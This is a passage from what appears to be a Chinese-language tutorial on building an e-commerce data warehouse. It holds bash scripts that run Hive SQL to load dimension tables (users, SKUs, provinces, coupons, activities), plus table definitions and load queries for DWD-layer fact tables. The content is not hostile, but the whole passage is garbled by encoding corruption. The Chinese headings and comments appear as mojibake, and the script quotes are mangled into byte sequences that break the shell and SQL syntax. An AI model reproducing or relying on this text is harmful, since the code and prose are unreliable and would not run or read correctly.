as</p><p>(</p><p>select</p><p>id,</p><p>tm_name</p><p>from ${APP}.ods_base_trademark_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(â€˜attr_idâ€™,attr_id,â€™value_idâ€™,value_id,â€™attr_nameâ€™,attr_name,â€™value_nameâ€™,value_name))<br>attrs</p><p>from ${APP}.ods_sku_attr_value_full</p><p>where dt=â€™$do_dateâ€™</p><p>group by sku_id</p><p>),</p><p>sale_attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(â€˜sale_attr_idâ€™,sale_attr_id,â€™sale_attr_value_idâ€™,sale_attr_value_id,â€™sale_attr_nameâ€™,sale_attr_name,â€™sale_attr_value_nameâ€™,sale_attr_value_name))<br>sale_attrs</p><p>from ${APP}.ods_sku_sale_attr_value_full</p><p>where dt=â€™$do_dateâ€™</p><p>group by sku_id</p><p>)</p><p>insert overwrite table ${APP}.dim_sku_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>sku.id,</p><p>sku.price,</p><p>sku.sku_name,</p><p>sku.sku_desc,</p><p>sku.weight,</p><p>sku.is_sale,</p><p>sku.spu_id,</p><p>spu.spu_name,</p><p>sku.category3_id,</p><p>c3.name,</p><p>c3.category2_id,</p><p>c2.name,</p><p>c2.category1_id,</p><p>c1.name,</p><p>sku.tm_id,</p><p>tm.tm_name,</p><p>attr.attrs,</p><p>sale_attr.sale_attrs,</p><p>sku.create_time</p><p>from sku</p><p>left join spu on sku.spu_id=spu.id</p><p>left join c3 on sku.category3_id=c3.id</p><p>left join c2 on c3.category2_id=c2.id</p><p>left join c1 on c2.category1_id=c1.id</p><p>left join tm on sku.tm_id=tm.id</p><p>left join attr on sku.id=attr.sku_id</p><p>left join sale_attr on sku.id=sale_attr.sku_id;</p><p>â€œ</p><p>dim_province_full=â€</p><p>insert overwrite table ${APP}.dim_province_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province.id,</p><p>province.name,</p><p>province.area_code,</p><p>province.iso_code,</p><p>province.iso_3166_2,</p><p>region_id,</p><p>region_name</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>region_id,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)province</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>region_name</p><p>from ${APP}.ods_base_region_full</p><p>where dt=â€™$do_dateâ€™</p><p>)region</p><p>on province.region_id=region.id;</p><p>â€œ</p><p>dim_coupon_full=â€</p><p>insert overwrite table ${APP}.dim_coupon_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>coupon_dic.dic_name,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case coupon_type</p><p>when â€˜3201â€™ then concat(â€˜æ»¡â€™,condition_amount,â€™å…ƒå‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>when â€˜3202â€™ then concat(â€˜æ»¡â€™,condition_num,â€™ä»¶æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>when â€˜3203â€™ then concat(â€˜å‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>end benefit_rule,</p><p>create_time,</p><p>range_type,</p><p>range_dic.dic_name,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>create_time,</p><p>range_type,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from ${APP}.ods_coupon_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™32â€™</p><p>)coupon_dic</p><p>on ci.coupon_type=coupon_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™33â€™</p><p>)range_dic</p><p>on ci.range_type=range_dic.dic_code;</p><p>â€œ</p><p>dim_activity_full=â€</p><p>insert overwrite table ${APP}.dim_activity_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>rule.id,</p><p>info.id,</p><p>activity_name,</p><p>rule.activity_type,</p><p>dic.dic_name,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case rule.activity_type</p><p>when â€˜3101â€™ then concat(â€˜æ»¡â€™,condition_amount,â€™å…ƒå‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>when â€˜3102â€™ then concat(â€˜æ»¡â€™,condition_num,â€™ä»¶æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>when â€˜3103â€™ then concat(â€˜æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>end benefit_rule,</p><p>benefit_level</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>activity_id,</p><p>activity_type,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>benefit_level</p><p>from ${APP}.ods_activity_rule_full</p><p>where dt=â€™$do_dateâ€™</p><p>)rule</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>activity_name,</p><p>activity_type,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time</p><p>from ${APP}.ods_activity_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>)info</p><p>on rule.activity_id=info.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™31â€™</p><p>)dic</p><p>on rule.activity_type=dic.dic_code;</p><p>â€œ</p><p>case $1 in</p><p>â€œdim_user_zipâ€)</p><p>hive -e â€œ$dim_user_zipâ€</p><p>;;</p><p>â€œdim_sku_fullâ€)</p><p>hive -e â€œ$dim_sku_fullâ€</p><p>;;</p><p>â€œdim_province_fullâ€)</p><p>hive -e â€œ$dim_province_fullâ€</p><p>;;</p><p>â€œdim_coupon_fullâ€)</p><p>hive -e â€œ$dim_coupon_fullâ€</p><p>;;</p><p>â€œdim_activity_fullâ€)</p><p>hive -e â€œ$dim_activity_fullâ€</p><p>;;</p><p>â€œallâ€)</p><p>hive -e<br>â€œ$dim_user_zip$dim_sku_full$dim_province_full$dim_coupon_full$dim_activity_fullâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dim_init.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ ods_to_dim_init.sh all 2020-06-14</p><h4 id="æ¯æ—¥è£…è½½è„šæœ¬"><a href="#æ¯æ—¥è£…è½½è„šæœ¬" class="headerlink" title="æ¯æ—¥è£…è½½è„šæœ¬"></a>æ¯æ—¥è£…è½½è„šæœ¬</h4><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºods_to_dim.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dim.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## å¦‚æœæ˜¯è¾“å…¥çš„æ—¥æœŸæŒ‰ç…§å–è¾“å…¥æ—¥æœŸï¼›å¦‚æœæ²¡è¾“å…¥æ—¥æœŸå–å½“å‰æ—¶é—´çš„å‰ä¸€å¤©</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>dim_user_zip=â€</p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>with</p><p>tmp as</p><p>(</p><p>select</p><p>old.id old_id,</p><p>old.login_name old_login_name,</p><p>old.nick_name old_nick_name,</p><p>old.name old_name,</p><p>old.phone_num old_phone_num,</p><p>old.email old_email,</p><p>old.user_level old_user_level,</p><p>old.birthday old_birthday,</p><p>old.gender old_gender,</p><p>old.create_time old_create_time,</p><p>old.operate_time old_operate_time,</p><p>old.start_date old_start_date,</p><p>old.end_date old_end_date,</p><p>new.id new_id,</p><p>new.login_name new_login_name,</p><p>new.nick_name new_nick_name,</p><p>new.name new_name,</p><p>new.phone_num new_phone_num,</p><p>new.email new_email,</p><p>new.user_level new_user_level,</p><p>new.birthday new_birthday,</p><p>new.gender new_gender,</p><p>new.create_time new_create_time,</p><p>new.operate_time new_operate_time,</p><p>new.start_date new_start_date,</p><p>new.end_date new_end_date</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>name,</p><p>phone_num,</p><p>email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>start_date,</p><p>end_date</p><p>from ${APP}.dim_user_zip</p><p>where dt=â€™9999-12-31â€™</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>md5(name) name,</p><p>md5(phone_num) phone_num,</p><p>md5(email) email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>â€˜$do_dateâ€™ start_date,</p><p>â€˜9999-12-31â€™ end_date</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>data.name,</p><p>data.phone_num,</p><p>data.email,</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>row_number() over (partition by data.id order by ts desc) rn</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>)t1</p><p>where rn=1</p><p>)new</p><p>on old.id=new.id</p><p>)</p><p>insert overwrite table ${APP}.dim_user_zip partition(dt)</p><p>select</p><p>if(new_id is not null,new_id,old_id),</p><p>if(new_id is not null,new_login_name,old_login_name),</p><p>if(new_id is not null,new_nick_name,old_nick_name),</p><p>if(new_id is not null,new_name,old_name),</p><p>if(new_id is not null,new_phone_num,old_phone_num),</p><p>if(new_id is not null,new_email,old_email),</p><p>if(new_id is not null,new_user_level,old_user_level),</p><p>if(new_id is not null,new_birthday,old_birthday),</p><p>if(new_id is not null,new_gender,old_gender),</p><p>if(new_id is not null,new_create_time,old_create_time),</p><p>if(new_id is not null,new_operate_time,old_operate_time),</p><p>if(new_id is not null,new_start_date,old_start_date),</p><p>if(new_id is not null,new_end_date,old_end_date),</p><p>if(new_id is not null,new_end_date,old_end_date) dt</p><p>from tmp</p><p>union all</p><p>select</p><p>old_id,</p><p>old_login_name,</p><p>old_nick_name,</p><p>old_name,</p><p>old_phone_num,</p><p>old_email,</p><p>old_user_level,</p><p>old_birthday,</p><p>old_gender,</p><p>old_create_time,</p><p>old_operate_time,</p><p>old_start_date,</p><p>cast(date_add(â€˜$do_dateâ€™,-1) as string) old_end_date,</p><p>cast(date_add(â€˜$do_dateâ€™,-1) as string) dt</p><p>from tmp</p><p>where old_id is not null</p><p>and new_id is not null;</p><p>â€œ</p><p>dim_sku_full=â€</p><p>with</p><p>sku as</p><p>(</p><p>select</p><p>id,</p><p>price,</p><p>sku_name,</p><p>sku_desc,</p><p>weight,</p><p>is_sale,</p><p>spu_id,</p><p>category3_id,</p><p>tm_id,</p><p>create_time</p><p>from ${APP}.ods_sku_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>spu as</p><p>(</p><p>select</p><p>id,</p><p>spu_name</p><p>from ${APP}.ods_spu_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>c3 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category2_id</p><p>from ${APP}.ods_base_category3_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>c2 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category1_id</p><p>from ${APP}.ods_base_category2_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>c1 as</p><p>(</p><p>select</p><p>id,</p><p>name</p><p>from ${APP}.ods_base_category1_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>tm as</p><p>(</p><p>select</p><p>id,</p><p>tm_name</p><p>from ${APP}.ods_base_trademark_full</p><p>where dt=â€™$do_dateâ€™</p><p>),</p><p>attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(â€˜attr_idâ€™,attr_id,â€™value_idâ€™,value_id,â€™attr_nameâ€™,attr_name,â€™value_nameâ€™,value_name))<br>attrs</p><p>from ${APP}.ods_sku_attr_value_full</p><p>where dt=â€™$do_dateâ€™</p><p>group by sku_id</p><p>),</p><p>sale_attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(â€˜sale_attr_idâ€™,sale_attr_id,â€™sale_attr_value_idâ€™,sale_attr_value_id,â€™sale_attr_nameâ€™,sale_attr_name,â€™sale_attr_value_nameâ€™,sale_attr_value_name))<br>sale_attrs</p><p>from ${APP}.ods_sku_sale_attr_value_full</p><p>where dt=â€™$do_dateâ€™</p><p>group by sku_id</p><p>)</p><p>insert overwrite table ${APP}.dim_sku_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>sku.id,</p><p>sku.price,</p><p>sku.sku_name,</p><p>sku.sku_desc,</p><p>sku.weight,</p><p>sku.is_sale,</p><p>sku.spu_id,</p><p>spu.spu_name,</p><p>sku.category3_id,</p><p>c3.name,</p><p>c3.category2_id,</p><p>c2.name,</p><p>c2.category1_id,</p><p>c1.name,</p><p>sku.tm_id,</p><p>tm.tm_name,</p><p>attr.attrs,</p><p>sale_attr.sale_attrs,</p><p>sku.create_time</p><p>from sku</p><p>left join spu on sku.spu_id=spu.id</p><p>left join c3 on sku.category3_id=c3.id</p><p>left join c2 on c3.category2_id=c2.id</p><p>left join c1 on c2.category1_id=c1.id</p><p>left join tm on sku.tm_id=tm.id</p><p>left join attr on sku.id=attr.sku_id</p><p>left join sale_attr on sku.id=sale_attr.sku_id;</p><p>â€œ</p><p>dim_province_full=â€</p><p>insert overwrite table ${APP}.dim_province_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province.id,</p><p>province.name,</p><p>province.area_code,</p><p>province.iso_code,</p><p>province.iso_3166_2,</p><p>region_id,</p><p>region_name</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>region_id,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)province</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>region_name</p><p>from ${APP}.ods_base_region_full</p><p>where dt=â€™$do_dateâ€™</p><p>)region</p><p>on province.region_id=region.id;</p><p>â€œ</p><p>dim_coupon_full=â€</p><p>insert overwrite table ${APP}.dim_coupon_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>coupon_dic.dic_name,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case coupon_type</p><p>when â€˜3201â€™ then concat(â€˜æ»¡â€™,condition_amount,â€™å…ƒå‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>when â€˜3202â€™ then concat(â€˜æ»¡â€™,condition_num,â€™ä»¶æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>when â€˜3203â€™ then concat(â€˜å‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>end benefit_rule,</p><p>create_time,</p><p>range_type,</p><p>range_dic.dic_name,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>create_time,</p><p>range_type,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from ${APP}.ods_coupon_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™32â€™</p><p>)coupon_dic</p><p>on ci.coupon_type=coupon_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™33â€™</p><p>)range_dic</p><p>on ci.range_type=range_dic.dic_code;</p><p>â€œ</p><p>dim_activity_full=â€</p><p>insert overwrite table ${APP}.dim_activity_full partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>rule.id,</p><p>info.id,</p><p>activity_name,</p><p>rule.activity_type,</p><p>dic.dic_name,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case rule.activity_type</p><p>when â€˜3101â€™ then concat(â€˜æ»¡â€™,condition_amount,â€™å…ƒå‡â€™,benefit_amount,â€™å…ƒâ€™)</p><p>when â€˜3102â€™ then concat(â€˜æ»¡â€™,condition_num,â€™ä»¶æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>when â€˜3103â€™ then concat(â€˜æ‰“â€™,10*(1-benefit_discount),â€™æŠ˜â€™)</p><p>end benefit_rule,</p><p>benefit_level</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>activity_id,</p><p>activity_type,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>benefit_level</p><p>from ${APP}.ods_activity_rule_full</p><p>where dt=â€™$do_dateâ€™</p><p>)rule</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>activity_name,</p><p>activity_type,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time</p><p>from ${APP}.ods_activity_info_full</p><p>where dt=â€™$do_dateâ€™</p><p>)info</p><p>on rule.activity_id=info.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™31â€™</p><p>)dic</p><p>on rule.activity_type=dic.dic_code;</p><p>â€œ</p><p>case $1 in</p><p>â€œdim_user_zipâ€)</p><p>hive -e â€œ$dim_user_zipâ€</p><p>;;</p><p>â€œdim_sku_fullâ€)</p><p>hive -e â€œ$dim_sku_fullâ€</p><p>;;</p><p>â€œdim_province_fullâ€)</p><p>hive -e â€œ$dim_province_fullâ€</p><p>;;</p><p>â€œdim_coupon_fullâ€)</p><p>hive -e â€œ$dim_coupon_fullâ€</p><p>;;</p><p>â€œdim_activity_fullâ€)</p><p>hive -e â€œ$dim_activity_fullâ€</p><p>;;</p><p>â€œallâ€)</p><p>hive -e<br>â€œ$dim_user_zip$dim_sku_full$dim_province_full$dim_coupon_full$dim_activity_fullâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dim.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ ods_to_dim.sh all 2020-06-14</p><h2 id="ç¬¬9ç« -æ•°ä»“å¼€å‘ä¹‹DWDå±‚"><a href="#ç¬¬9ç« -æ•°ä»“å¼€å‘ä¹‹DWDå±‚" class="headerlink" title="ç¬¬9ç«  æ•°ä»“å¼€å‘ä¹‹DWDå±‚"></a>ç¬¬9ç«  æ•°ä»“å¼€å‘ä¹‹DWDå±‚</h2><p>DWDå±‚è®¾è®¡è¦ç‚¹ï¼š</p><p>1ï¼‰DWDå±‚çš„è®¾è®¡ä¾æ®æ˜¯ç»´åº¦å»ºæ¨¡ç†è®ºï¼Œè¯¥å±‚å­˜å‚¨ç»´åº¦æ¨¡å‹çš„äº‹å®è¡¨ã€‚</p><p>2ï¼‰DWDå±‚çš„æ•°æ®å­˜å‚¨æ ¼å¼ä¸ºorcåˆ—å¼å­˜å‚¨+snappyå‹ç¼©ã€‚</p><p>3ï¼‰DWDå±‚è¡¨åçš„å‘½åè§„èŒƒä¸ºdwd_æ•°æ®åŸŸ_è¡¨å_å•åˆ†åŒºå¢é‡å…¨é‡æ ‡è¯†ï¼ˆinc/fullï¼‰</p><h3 id="äº¤æ˜“åŸŸåŠ è´­äº‹åŠ¡äº‹å®è¡¨"><a href="#äº¤æ˜“åŸŸåŠ è´­äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº¤æ˜“åŸŸåŠ è´­äº‹åŠ¡äº‹å®è¡¨"></a>äº¤æ˜“åŸŸåŠ è´­äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_trade_cart_add_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_cart_add_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“idâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¶é—´idâ€™,</p><p>`create_time` STRING COMMENT â€˜åŠ è´­æ—¶é—´â€™,</p><p>`source_id` STRING COMMENT â€˜æ¥æºç±»å‹IDâ€™,</p><p>`source_type_code` STRING COMMENT â€˜æ¥æºç±»å‹ç¼–ç â€™,</p><p>`source_type_name` STRING COMMENT â€˜æ¥æºç±»å‹åç§°â€™,</p><p>`sku_num` BIGINT COMMENT â€˜åŠ è´­ç‰©è½¦ä»¶æ•°â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸåŠ è´­ç‰©è½¦äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_trade_cart_add_inc/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰åˆ†åŒºè§„åˆ’</strong></p><p><strong>3ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰æ•°æ®æµå‘</strong></p><p><strong>ï¼ˆ2ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_trade_cart_add_inc partition (dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic.dic_name,</p><p>sku_num,</p><p>date_format(create_time, â€˜yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num</p><p>from ods_cart_info_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on ci.source_type=dic.dic_code;</p><p><strong>ï¼ˆ3ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_cart_add_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type_code,</p><p>source_type_name,</p><p>sku_num</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(from_utc_timestamp(ts*1000,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts*1000,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™)<br>create_time,</p><p>data.source_id,</p><p>data.source_type source_type_code,</p><p>if(type=â€™insertâ€™,data.sku_num,data.sku_num-old[â€˜sku_numâ€™]) sku_num</p><p>from ods_cart_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and (type=â€™insertâ€™</p><p>or(type=â€™updateâ€™ and old[â€˜sku_numâ€™] is not null and<br>data.sku_num&gt;cast(old[â€˜sku_numâ€™] as int)))</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name source_type_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on cart.source_type_code=dic.dic_code;</p><h3 id="äº¤æ˜“åŸŸä¸‹å•äº‹åŠ¡äº‹å®è¡¨"><a href="#äº¤æ˜“åŸŸä¸‹å•äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº¤æ˜“åŸŸä¸‹å•äº‹åŠ¡äº‹å®è¡¨"></a>äº¤æ˜“åŸŸä¸‹å•äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_trade_order_detail_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_order_detail_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`order_id` STRING COMMENT â€˜è®¢å•idâ€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“idâ€™,</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`activity_id` STRING COMMENT â€˜å‚ä¸æ´»åŠ¨è§„åˆ™idâ€™,</p><p>`activity_rule_id` STRING COMMENT â€˜å‚ä¸æ´»åŠ¨è§„åˆ™idâ€™,</p><p>`coupon_id` STRING COMMENT â€˜ä½¿ç”¨ä¼˜æƒ åˆ¸idâ€™,</p><p>`date_id` STRING COMMENT â€˜ä¸‹å•æ—¥æœŸidâ€™,</p><p>`create_time` STRING COMMENT â€˜ä¸‹å•æ—¶é—´â€™,</p><p>`source_id` STRING COMMENT â€˜æ¥æºç¼–å·â€™,</p><p>`source_type_code` STRING COMMENT â€˜æ¥æºç±»å‹ç¼–ç â€™,</p><p>`source_type_name` STRING COMMENT â€˜æ¥æºç±»å‹åç§°â€™,</p><p>`sku_num` BIGINT COMMENT â€˜å•†å“æ•°é‡â€™,</p><p>`split_original_amount` DECIMAL(16, 2) COMMENT â€˜åŸå§‹ä»·æ ¼â€™,</p><p>`split_activity_amount` DECIMAL(16, 2) COMMENT â€˜æ´»åŠ¨ä¼˜æƒ åˆ†æ‘Šâ€™,</p><p>`split_coupon_amount` DECIMAL(16, 2) COMMENT â€˜ä¼˜æƒ åˆ¸ä¼˜æƒ åˆ†æ‘Šâ€™,</p><p>`split_total_amount` DECIMAL(16, 2) COMMENT â€˜æœ€ç»ˆä»·æ ¼åˆ†æ‘Šâ€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸä¸‹å•æ˜ç»†äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_trade_order_detail_inc/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_trade_order_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(create_time, â€˜yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = 